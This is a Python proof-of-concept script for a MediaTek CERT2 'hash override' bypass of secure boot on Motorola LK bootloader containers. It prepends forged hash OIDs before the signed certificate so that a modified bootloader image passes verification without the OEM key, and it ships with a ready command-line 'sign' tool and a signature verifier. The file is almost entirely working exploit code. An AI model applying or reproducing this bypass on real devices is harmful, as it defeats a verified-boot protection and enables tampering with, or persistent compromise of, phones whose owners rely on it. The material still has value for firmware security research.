#!/usr/bin/env python3
"""
Self-contained MediaTek CERT2 hash-override ("cert bypass") for Motorola MTK
LK containers, plus a compact CERT1/CERT2 verifier.

This is the single piece of the "val protocol" project that maps onto fenrir:
the `CertBypass.OVERRIDE` behaviour. It does NOT do any of the unlock/FRP
patching. It only makes a modified LK container pass the MTK libsec hash check
without a valid OEM key, by exploiting the parser's "first OID wins" behaviour.

Mechanism
---------
Each sub-image in a Motorola MTK LK container is followed by CERT1 + CERT2.
CERT2 is an X.509 certificate whose signed content embeds two MTK-specific OIDs:

    2.16.886.2454.2.4  image header hash  (SHA-256/SHA-384)
    2.16.886.2454.2.1  image hash         (SHA-256/SHA-384)

When you patch a payload those hashes no longer match, and you cannot re-sign
CERT2 because you do not have the OEM private key. The bypass prepends a fresh
context-specific TLV before the original CERT2 DER:

    a0 58
      06 07 60 86 76 93 16 02 04        OID 2.16.886.2454.2.4
      03 21 00 <32-byte header hash>    BIT STRING
      06 07 60 86 76 93 16 02 01        OID 2.16.886.2454.2.1
      03 21 00 <32-byte image hash>     BIT STRING
    <original 0x30 ... CERT2 SEQUENCE>

libsec scans for the first occurrence of each hash OID, finds the prepended
values, and accepts them; the original certificate and its RSA-PSS signatures
are left untouched, so signature checks still pass. (SHA-384 builds use 0x31
BIT STRING lengths.)

This is dependency-free (stdlib only). It is derived from the observed cert
layout of `firmware/V1TDS35H.83-20-5-12/lk.img` and from the public fenrir /
val-protocol research, but shares no code with either project.

Usage
-----
    python3 poc/mtk_cert.py sign firmware/.../lk.img -o out.img
    python3 poc/mtk_cert.py sign in.img -o out.img --partitions lk,bl2_ext,aee
    python3 poc/mtk_cert.py verify out.img --all
"""

from __future__ import annotations

import argparse
import hashlib
import struct
import sys
from pathlib import Path


# --------------------------------------------------------------------------- #
# MTK part_hdr_t container
# --------------------------------------------------------------------------- #

PART_MAGIC = 0x58881688
EXT_MAGIC = 0x58891689
PART_HDR_SIZE = 0x200
PART_HDR_FORMAT = "<II32sIIIIIIIIII"

IMG_TYPE_GROUP_CERT = 0x02 << 24
IMG_TYPE_CERT1 = IMG_TYPE_GROUP_CERT | 0x00
IMG_TYPE_CERT2 = IMG_TYPE_GROUP_CERT | 0x02

OID_IMAGE_HEADER_HASH = "2.16.886.2454.2.4"
OID_IMAGE_HASH = "2.16.886.2454.2.1"
OID_ROOT_KEY = "2.16.886.2454.1.1"
OID_IMG_PUBK = "2.16.886.2454.1.2"
OID_RSA = "1.2.840.113549.1.1.1"
OID_RSASSA_PSS = "1.2.840.113549.1.1.10"
OID_SEC_LEVEL = "2.16.886.2454.2.9"
OID_IMG_VER = "2.16.886.2454.2.2"
OID_APPLY_SIG = "2.16.886.2454.3.2"


def roundup(value: int, align: int) -> int:
    if align <= 0:
        return value
    return (value + align - 1) & ~(align - 1)


class PartHdr:
    __slots__ = (
        "off", "magic", "dsize", "name", "maddr", "mode", "ext_magic",
        "hdr_sz", "hdr_ver", "img_type", "img_list_end", "align_sz",
        "dsize_extend", "maddr_extend",
    )

    def __init__(self, off: int, raw: bytes):
        vals = struct.unpack_from(PART_HDR_FORMAT, raw, 0)
        self.off = off
        self.magic = vals[0]
        self.dsize = vals[1]
        self.name = vals[2].split(b"\0", 1)[0].decode("latin-1")
        self.maddr = vals[3]
        self.mode = vals[4]
        self.ext_magic = vals[5]
        self.hdr_sz = vals[6] or PART_HDR_SIZE
        self.hdr_ver = vals[7]
        self.img_type = vals[8]
        self.img_list_end = vals[9]
        self.align_sz = vals[10] or 1
        self.dsize_extend = vals[11]
        self.maddr_extend = vals[12]

    @property
    def data_off(self) -> int:
        return self.off + PART_HDR_SIZE

    @property
    def padded_size(self) -> int:
        return roundup(self.dsize, self.align_sz)

    @property
    def end(self) -> int:
        return self.data_off + self.padded_size

    @property
    def is_cert(self) -> bool:
        return (self.img_type & 0xFF000000) == IMG_TYPE_GROUP_CERT

    @property
    def is_cert1(self) -> bool:
        return self.is_cert and (self.img_type == IMG_TYPE_CERT1 or self.name.lower().startswith("cert1"))

    @property
    def is_cert2(self) -> bool:
        return self.is_cert and (self.img_type == IMG_TYPE_CERT2 or self.name.lower().startswith("cert2"))


def parse_parts(data: bytes) -> list[PartHdr]:
    parts: list[PartHdr] = []
    off = 0
    while off + PART_HDR_SIZE <= len(data):
        hdr = PartHdr(off, data[off : off + PART_HDR_SIZE])
        if hdr.magic != PART_MAGIC:
            break
        if hdr.end > len(data):
            raise ValueError(f"partition {hdr.name!r} data exceeds file size")
        parts.append(hdr)
        if hdr.img_list_end:
            break
        off = hdr.end
    if not parts:
        raise ValueError("no part_hdr_t entries found")
    return parts


def signed_triples(parts: list[PartHdr]) -> list[tuple[PartHdr, PartHdr, PartHdr]]:
    """Return (image, cert1, cert2) triples in container order."""
    out: list[tuple[PartHdr, PartHdr, PartHdr]] = []
    i = 0
    while i + 2 < len(parts):
        img, c1, c2 = parts[i], parts[i + 1], parts[i + 2]
        if not img.is_cert and c1.is_cert1 and c2.is_cert2:
            out.append((img, c1, c2))
            i += 3
        else:
            i += 1
    return out


# --------------------------------------------------------------------------- #
# Minimal DER (ASN.1) helpers
# --------------------------------------------------------------------------- #

def _read_tag(buf: bytes, off: int) -> tuple[int, int, bool, int, int]:
    first = buf[off]
    cls = (first & 0xC0) >> 6
    constructed = bool(first & 0x20)
    tagnum = first & 0x1F
    i = off + 1
    if tagnum == 0x1F:
        tagnum = 0
        while True:
            b = buf[i]
            tagnum = (tagnum << 7) | (b & 0x7F)
            i += 1
            if not (b & 0x80):
                break
    return cls, constructed, tagnum, i - off, buf[off:i]


def _read_length(buf: bytes, off: int) -> tuple[int, int]:
    first = buf[off]
    if first < 0x80:
        return first, 1
    count = first & 0x7F
    return int.from_bytes(buf[off + 1 : off + 1 + count], "big"), 1 + count


def _encode_length(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def _encode_oid(oid: str) -> bytes:
    parts = [int(x) for x in oid.split(".")]
    out = bytearray([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        groups = [p & 0x7F]
        p >>= 7
        while p:
            groups.insert(0, (p & 0x7F) | 0x80)
            p >>= 7
        out.extend(groups)
    return bytes(out)


def _decode_oid(raw: bytes) -> str:
    parts = [str(raw[0] // 40), str(raw[0] % 40)]
    val = 0
    for b in raw[1:]:
        val = (val << 7) | (b & 0x7F)
        if not (b & 0x80):
            parts.append(str(val))
            val = 0
    return ".".join(parts)


def _oid_tlv(oid: str) -> bytes:
    body = _encode_oid(oid)
    return b"\x06" + _encode_length(len(body)) + body


def _bitstring_tlv(payload: bytes) -> bytes:
    body = b"\x00" + payload
    return b"\x03" + _encode_length(len(body)) + body


class DerNode:
    __slots__ = ("off", "tag", "cls", "constructed", "value_off", "end", "children", "parent")

    def __init__(self, off: int, tag: int, cls: int, constructed: bool, value_off: int, end: int):
        self.off = off
        self.tag = tag
        self.cls = cls
        self.constructed = constructed
        self.value_off = value_off
        self.end = end
        self.children: list[DerNode] | None = [] if constructed else None
        self.parent: DerNode | None = None


def _parse_der_nodes(data: bytes, start: int, end: int, parent: DerNode | None) -> list[DerNode]:
    out: list[DerNode] = []
    off = start
    while off < end:
        cls, constructed, tagnum, tag_len, _tag_bytes = _read_tag(data, off)
        length, len_len = _read_length(data, off + tag_len)
        hdr = tag_len + len_len
        value_off = off + hdr
        node_end = value_off + length
        if node_end > end:
            raise ValueError("truncated DER value")
        node = DerNode(off, tagnum, cls, constructed, value_off, node_end)
        node.parent = parent
        if constructed:
            node.children = _parse_der_nodes(data, value_off, node_end, node)
        out.append(node)
        off = node_end
    return out


def _walk(nodes: list[DerNode]):
    for n in nodes:
        yield n
        if n.children:
            yield from _walk(n.children)


def _node_oid(data: bytes, node: DerNode) -> str | None:
    if node.cls == 0 and node.tag == 6 and not node.constructed:
        return _decode_oid(data[node.value_off : node.end])
    return None


def _sibling(data: bytes, root_nodes: list[DerNode], oid: str, tag: int | None) -> DerNode | None:
    for node in _walk(root_nodes):
        if _node_oid(data, node) != oid:
            continue
        sibs = node.parent.children if node.parent else root_nodes
        idx = sibs.index(node)
        if idx + 1 < len(sibs):
            nxt = sibs[idx + 1]
            if tag is None or nxt.tag == tag:
                return nxt
    return None


def _first_top_sequence(data: bytes, nodes: list[DerNode]) -> DerNode:
    for n in nodes:
        if n.cls == 0 and n.constructed and n.tag == 0x10:
            return n
    raise ValueError("no X.509 SEQUENCE found")


def _bitstring(data: bytes, node: DerNode) -> bytes:
    if node.tag != 0x03:
        raise ValueError("expected BIT STRING")
    body = data[node.value_off : node.end]
    if body[0] != 0:
        raise ValueError("unsupported non-zero unused bits")
    return body[1:]


def _integer(data: bytes, node: DerNode) -> int:
    if node.tag != 0x02:
        raise ValueError("expected INTEGER")
    return int.from_bytes(data[node.value_off : node.end], "big")


def _der_int_bytes(data: bytes, node: DerNode) -> bytes:
    v = data[node.value_off : node.end]
    if len(v) >= 2 and v[0] == 0 and v[1] & 0x80:
        v = v[1:]
    return v


# --------------------------------------------------------------------------- #
# CERT2 hash override (the exploit)
# --------------------------------------------------------------------------- #

def _find_oid_bitstring(data: bytes, der: bytes, oid: str) -> tuple[bytes, int] | None:
    """Return (payload_bytes_without_unused_bits, alg_size_hint) for the first OID."""
    root = _parse_der_nodes(der, 0, len(der), None)
    node = _sibling(der, root, oid, 0x03)
    if node is None:
        return None
    payload = _bitstring(der, node)
    return payload, len(payload)


def _original_cert_der(der: bytes) -> bytes:
    """Find the first top-level 0x30 SEQUENCE, skipping any prepended overrides."""
    off = 0
    while off < len(der):
        cls, constructed, tagnum, tag_len, _tb = _read_tag(der, off)
        length, len_len = _read_length(der, off + tag_len)
        node_end = off + tag_len + len_len + length
        if cls == 0 and constructed and tagnum == 0x10:
            return der[off:node_end]
        off = node_end
    raise ValueError("original CERT2 DER SEQUENCE not found")


def _build_hash_override(header_digest: bytes | None, image_digest: bytes | None) -> bytes:
    body = bytearray()
    if header_digest is not None:
        body += _oid_tlv(OID_IMAGE_HEADER_HASH)
        body += _bitstring_tlv(header_digest)
    if image_digest is not None:
        body += _oid_tlv(OID_IMAGE_HASH)
        body += _bitstring_tlv(image_digest)
    return b"\xa0" + _encode_length(len(body)) + bytes(body)


def _digest_for(data: bytes, cert2_der: bytes) -> callable:
    found = _find_oid_bitstring(data, cert2_der, OID_IMAGE_HASH)
    size = found[1] if found else 32
    return hashlib.sha256 if size == 32 else hashlib.sha384


def apply_cert_bypass(data: bytes, targets: set[str]) -> bytes:
    """Prepend CERT2 hash overrides for every target sub-image. Returns new bytes."""
    parts = parse_parts(data)
    triples = signed_triples(parts)
    # map cert2 part -> its target image part, for images we are overriding
    override_cert2: dict[int, PartHdr] = {
        id(c2): img for img, _c1, c2 in triples if img.name in targets
    }

    out = bytearray()
    for p in parts:
        header = data[p.off : p.off + PART_HDR_SIZE]
        raw_data = data[p.data_off : p.data_off + p.dsize]
        if p.dsize > 0 and len(raw_data) != p.dsize:
            raise ValueError(f"short data for {p.name!r}")

        if id(p) in override_cert2:
            img = override_cert2[id(p)]
            digest = _digest_for(data, raw_data)
            hdr_bytes = data[img.off : img.off + img.hdr_sz]
            padded = bytearray(data[img.data_off : img.data_off + img.dsize])
            pad = img.padded_size - img.dsize
            if pad > 0:
                padded += b"\0" * pad
            new_hdr_hash = digest(hdr_bytes).digest()
            new_img_hash = digest(bytes(padded)).digest()

            original = _original_cert_der(raw_data)
            new_der = _build_hash_override(new_hdr_hash, new_img_hash) + original
            # copy the original 512-byte header and patch only dsize
            new_header = bytearray(header)
            struct.pack_into("<I", new_header, 4, len(new_der))
            pad_to = roundup(len(new_der), p.align_sz) - len(new_der)
            out += new_header
            out += new_der
            out += b"\0" * pad_to
        else:
            pad_to = p.padded_size - p.dsize
            out += header
            out += raw_data
            out += b"\0" * pad_to

    return bytes(out)


# --------------------------------------------------------------------------- #
# Compact CERT1/CERT2 verifier
# --------------------------------------------------------------------------- #

def _parse_spki_rsa(data: bytes, spki: DerNode) -> tuple[bytes, bytes]:
    bit = None
    for child in spki.children or []:
        if child.tag == 0x03:
            bit = child
            break
    if bit is None:
        raise ValueError("SPKI BIT STRING not found")
    rsa_der = _bitstring(data, bit)
    rsa_nodes = _parse_der_nodes(rsa_der, 0, len(rsa_der), None)
    root = _first_top_sequence(rsa_der, rsa_nodes)
    if not root.children or len(root.children) < 2:
        raise ValueError("bad RSA public key SEQUENCE")
    return _der_int_bytes(rsa_der, root.children[0]), _der_int_bytes(rsa_der, root.children[1])


def _first_rsa_pub(data: bytes, nodes: list[DerNode]) -> tuple[bytes, bytes]:
    for node in _walk(nodes):
        if _node_oid(data, node) == OID_RSA:
            alg = node.parent
            spki = alg.parent if alg else None
            if spki and spki.children and any(c.tag == 0x03 for c in spki.children):
                return _parse_spki_rsa(data, spki)
    raise ValueError("RSA public key not found")


def _find_int_by_oid(data: bytes, nodes: list[DerNode], oid: str, default: int) -> int:
    node = _sibling(data, nodes, oid, 0x02)
    return default if node is None else _integer(data, node)


def _mgf1(seed: bytes, length: int, hash_name: str) -> bytes:
    out = bytearray()
    counter = 0
    while len(out) < length:
        h = hashlib.new(hash_name)
        h.update(seed)
        h.update(counter.to_bytes(4, "big"))
        out += h.digest()
        counter += 1
    return bytes(out[:length])


def _pss_verify(digest: bytes, encoded: bytes, em_bits: int, hash_name: str, salt_len: int | None = None) -> bool:
    h_len = hashlib.new(hash_name).digest_size
    salt_len = h_len if salt_len is None else salt_len
    em_len = (em_bits + 7) // 8
    if len(encoded) != em_len or em_len < h_len + salt_len + 2:
        return False
    if encoded[-1] != 0xBC:
        return False

    masked_db = encoded[: em_len - h_len - 1]
    h_val = encoded[em_len - h_len - 1 : em_len - 1]
    unused = 8 * em_len - em_bits
    if unused and masked_db[0] & (0xFF << (8 - unused)):
        return False

    db_mask = _mgf1(h_val, len(masked_db), hash_name)
    db = bytearray(a ^ b for a, b in zip(masked_db, db_mask))
    if unused:
        db[0] &= 0xFF >> unused

    ps_len = em_len - h_len - salt_len - 2
    if bytes(db[:ps_len]) != b"\0" * ps_len:
        return False
    if db[ps_len] != 1:
        return False

    salt = bytes(db[-salt_len:]) if salt_len else b""
    h2 = hashlib.new(hash_name)
    h2.update(b"\0" * 8)
    h2.update(digest)
    h2.update(salt)
    return h2.digest() == h_val


def _rsa_pss_verify(data: bytes, signature: bytes, n: bytes, e: int, hash_name: str) -> bool:
    if len(signature) != len(n):
        return False
    digest = hashlib.new(hash_name, data).digest()
    n_int = int.from_bytes(n, "big")
    sig_int = int.from_bytes(signature, "big")
    if sig_int >= n_int:
        return False
    encoded = pow(sig_int, e, n_int).to_bytes(len(n), "big")
    candidates: list[int] = []
    for bits in (n_int.bit_length() - 1, len(n) * 8 - 1, len(n) * 8):
        if bits > 0 and bits not in candidates:
            candidates.append(bits)
    return any(_pss_verify(digest, encoded, bits, hash_name) for bits in candidates)


def _parse_cert(blob: bytes) -> dict:
    nodes = _parse_der_nodes(blob, 0, len(blob), None)
    root = _first_top_sequence(blob, nodes)
    if not root.children or len(root.children) < 3:
        raise ValueError("certificate SEQUENCE incomplete")
    tbs = root.children[0]
    signature = _bitstring(blob, root.children[2])
    sec_level = _find_int_by_oid(blob, nodes, OID_SEC_LEVEL, 0) & 0xF
    pub_n, pub_e = _first_rsa_pub(blob, nodes)
    return {
        "tbs": blob[tbs.off : tbs.end],
        "signature": signature,
        "sec_level": sec_level,
        "n": pub_n,
        "e": int.from_bytes(pub_e, "big"),
        "nodes": nodes,
    }


def _hash_name(sec_level: int) -> str:
    return "sha256" if sec_level == 0 else "sha384"


def verify(data: bytes, only: str | None = None) -> bool:
    parts = parse_parts(data)
    triples = signed_triples(parts)
    if only:
        triples = [t for t in triples if t[0].name == only]
    if not triples:
        raise ValueError("no signed image found")

    ok_all = True
    for img, c1, c2 in triples:
        c1_blob = data[c1.data_off : c1.data_off + c1.dsize]
        c2_blob = data[c2.data_off : c2.data_off + c2.dsize]
        cert1 = _parse_cert(c1_blob)
        cert2 = _parse_cert(c2_blob)
        hname = _hash_name(cert1["sec_level"])

        c1_sig_ok = _rsa_pss_verify(cert1["tbs"], cert1["signature"], cert1["n"], cert1["e"], hname)

        img_pub = _sibling(c1_blob, cert1["nodes"], OID_IMG_PUBK, 0x10)
        if img_pub is None:
            raise ValueError("CERT1 image public key OID not found")
        img_n, img_e = _parse_spki_rsa(c1_blob, img_pub)
        pub_match = (cert2["n"] == img_n) and (cert2["e"] == int.from_bytes(img_e, "big"))
        c2_sig_ok = _rsa_pss_verify(cert2["tbs"], cert2["signature"], cert2["n"], cert2["e"], hname)

        hdr_hash = _sibling(c2_blob, cert2["nodes"], OID_IMAGE_HEADER_HASH, 0x03)
        img_hash = _sibling(c2_blob, cert2["nodes"], OID_IMAGE_HASH, 0x03)
        if hdr_hash is None or img_hash is None:
            raise ValueError(f"{img.name}: CERT2 hash OIDs not found")
        hdr_hash = _bitstring(c2_blob, hdr_hash)
        img_hash = _bitstring(c2_blob, img_hash)

        header = data[img.off : img.off + img.hdr_sz]
        padded = bytearray(data[img.data_off : img.data_off + img.dsize])
        pad = img.padded_size - img.dsize
        if pad > 0:
            padded += b"\0" * pad
        calc_hdr = hashlib.new(hname, header).digest()
        calc_img = hashlib.new(hname, bytes(padded)).digest()

        hdr_ok = hdr_hash == calc_hdr
        img_ok = img_hash == calc_img
        ok = c1_sig_ok and pub_match and c2_sig_ok and hdr_ok and img_ok

        print(f"Image: {img.name} @ 0x{img.off:x}  (cert2 dsize={c2.dsize})")
        print(f"  CERT1 signature     : {'OK' if c1_sig_ok else 'FAIL'}")
        print(f"  CERT2 key matches   : {'OK' if pub_match else 'FAIL'}")
        print(f"  CERT2 signature     : {'OK' if c2_sig_ok else 'FAIL'}")
        print(f"  Image header hash   : {'OK' if hdr_ok else 'FAIL'}")
        print(f"  Image data hash     : {'OK' if img_ok else 'FAIL'}")
        print(f"  Result              : {'VALID' if ok else 'INVALID'}")
        ok_all = ok_all and ok

    return ok_all


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def main(argv: list[str]) -> int:
    p = argparse.ArgumentParser(description="MTK CERT2 hash-override cert bypass")
    sub = p.add_subparsers(dest="cmd", required=True)

    ps = sub.add_parser("sign", help="prepend CERT2 hash overrides for patched payloads")
    ps.add_argument("image")
    ps.add_argument("-o", "--output", required=True)
    ps.add_argument("--partitions", default="lk,bl2_ext,aee",
                    help="comma-separated sub-images to override (default: lk,bl2_ext,aee)")

    pv = sub.add_parser("verify", help="verify CERT1/CERT2 signatures and hashes")
    pv.add_argument("image")
    pv.add_argument("-n", "--name", default=None, help="verify one sub-image")
    pv.add_argument("--all", action="store_true")

    args = p.parse_args(argv)

    try:
        data = Path(args.image).read_bytes()
    except OSError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    try:
        if args.cmd == "sign":
            targets = {s.strip() for s in args.partitions.split(",") if s.strip()}
            out = apply_cert_bypass(data, targets)
            Path(args.output).write_bytes(out)
            print(f"signed: {args.output} ({len(data)} -> {len(out)} bytes)")
            verify(out)
            return 0
        else:
            return 0 if verify(data, args.name if not args.all else None) else 1
    except (ValueError, struct.error, OSError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
